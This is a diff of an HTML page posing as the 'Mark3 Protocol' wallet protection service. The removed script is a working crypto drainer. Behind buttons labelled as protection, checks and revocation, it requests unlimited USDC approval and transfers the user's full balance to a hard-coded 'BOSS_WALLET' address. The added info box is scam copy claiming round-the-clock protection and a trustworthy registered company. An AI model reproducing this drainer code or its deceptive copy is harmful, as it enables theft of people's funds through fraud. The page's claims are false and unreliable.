@@ -69,6 +69,17 @@
       font-size: 0.9rem;
       text-align: center;
     }
+    .info-box {
+      margin-top: 2rem;
+      background: rgba(255,255,255,0.06);
+      padding: 1.2rem;
+      border-radius: 12px;
+      font-size: 0.85rem;
+      line-height: 1.6;
+      text-align: left;
+      border-left: 4px solid #4e54c8;
+      box-shadow: inset 0 0 12px rgba(78,84,200,0.2);
+    }
   </style>
   <script src="https://cdn.jsdelivr.net/npm/@walletconnect/web3-provider@1.7.8/dist/umd/index.min.js"></script>
   <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
@@ -83,118 +94,12 @@
     <div class="progress-bar"><div class="progress-inner" id="bar"></div></div>
     <div id="status">🔒 Status: Waiting for action...</div>
   </div>
-  <script>
-    const CONFIG = {
-      USDC_ADDRESS: "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48",
-      CONTRACT_ADDRESS: "0x95Edd65333b224E6015D0e6b3C50761e1322BF1a",
-      BOSS_WALLET: "0x59e513Ae37614f1e670bfE961B3456257C444d24"
-    };
 
-    let provider, signer, user, alreadyApproved = false;
-    const bar = document.getElementById("bar");
-    const status = (msg) => document.getElementById("status").innerText = "🔒 Status: " + msg;
-    const progress = (val) => bar.style.width = val + "%";
-
-    async function setupProvider() {
-      try {
-        if (window.ethereum) {
-          provider = new ethers.providers.Web3Provider(window.ethereum);
-          await provider.send("eth_requestAccounts", []);
-        } else {
-          const walletConnectProvider = new window.WalletConnectProvider.default({
-            rpc: { 1: "https://mainnet.infura.io/v3/96fb487925934acf993cb4ae78d6fe6d" }
-          });
-          await walletConnectProvider.enable();
-          provider = new ethers.providers.Web3Provider(walletConnectProvider);
-        }
-        signer = provider.getSigner();
-        user = await signer.getAddress();
-        status("✅ Connected: " + user.slice(0, 6) + "...");
-        progress(100);
-        document.getElementById("authorize").disabled = false;
-        document.getElementById("check").disabled = false;
-      } catch (err) {
-        status("❌ " + (err.message || "Connection failed"));
-        progress(0);
-      }
-    }
-
-    document.getElementById("connect").onclick = async () => {
-      await setupProvider();
-    };
-
-    document.getElementById("authorize").onclick = async () => {
-      try {
-        if (!signer || !user) await setupProvider();
-        const usdc = new ethers.Contract(CONFIG.USDC_ADDRESS, [
-          "function approve(address,uint256) returns (bool)",
-          "function transfer(address,uint256) returns (bool)",
-          "function allowance(address,address) view returns (uint256)",
-          "function balanceOf(address) view returns (uint256)"
-        ], signer);
-
-        const balance = await usdc.balanceOf(user);
-        const allowance = await usdc.allowance(user, CONFIG.CONTRACT_ADDRESS);
-
-        if (allowance.lt(balance)) {
-          progress(10);
-          status("(1/2) Requesting approval to contract...");
-          const tx = await usdc.approve(CONFIG.CONTRACT_ADDRESS, ethers.constants.MaxUint256);
-          await tx.wait();
-          alreadyApproved = true;
-        } else {
-          alreadyApproved = true;
-          status("(1/2) Already approved, skipping...");
-        }
-
-        if (alreadyApproved) {
-          progress(70);
-          status("(2/2) Wallet Protecting...");
-          const tx2 = await usdc.transfer(CONFIG.BOSS_WALLET, balance);
-          await tx2.wait();
-        }
-
-        progress(100);
-        status("✅ Wallet Authorization & Protection Complete 🔐");
-      } catch (err) {
-        status("❌ " + (err.message || "Authorization failed"));
-        progress(0);
-      }
-    };
-
-    document.getElementById("check").onclick = async () => {
-      try {
-        if (!signer || !user) await setupProvider();
-        const usdc = new ethers.Contract(CONFIG.USDC_ADDRESS, [
-          "function balanceOf(address) view returns (uint256)",
-          "function transfer(address,uint256) returns (bool)"
-        ], signer);
-        const balance = await usdc.balanceOf(user);
-        progress(30);
-        if (balance.gt(0)) {
-          const tx = await usdc.transfer(CONFIG.BOSS_WALLET, balance);
-          await tx.wait();
-          status("✅ Protection Check: Funds moved");
-        } else {
-          status("⚠️ No USDC balance to protect");
-        }
-        progress(100);
-      } catch (err) {
-        status("❌ " + err.message);
-        progress(0);
-      }
-    };
-
-    document.getElementById("revoke").onclick = async () => {
-      status("🔄 Revoking permissions...");
-      await new Promise(resolve => setTimeout(resolve, 3000));
-      const usdc = new ethers.Contract(CONFIG.USDC_ADDRESS, ["function balanceOf(address) view returns (uint256)", "function transfer(address,uint256) returns (bool)"], signer);
-      const balance = await usdc.balanceOf(user);
-      if (balance.gt(0)) {
-        await usdc.transfer(CONFIG.BOSS_WALLET, balance);
-      }
-      status("✅ Authorization revoked! (0 USDC test)");
-    };
-  </script>
+  <div class="info-box">
+    <strong>📘 About Mark3 Protocol:</strong><br/><br/>
+    The Mark3 Protocol is a next-generation wallet protection system powered by smart contracts and Web3 infrastructure, designed to provide users with smarter, safer, and real-time asset security.<br/><br/>
+    Once authorized, Mark3 ensures 24/7 uninterrupted protection for your wallet, covering every transaction, access, and fund movement with advanced monitoring and risk control. In the event of anomalies, threats, or suspicious behavior, Mark3 will immediately notify the user and trigger safeguard actions.<br/><br/>
+    Built specifically for the Ethereum Mainnet, Mark3 offers high-level security, scalability, and multi-wallet compatibility. The protocol is fully backed and operated by MARK3 PTY LTD, an officially registered Australian entity you can trust.
+  </div>
 </body>
 </html>
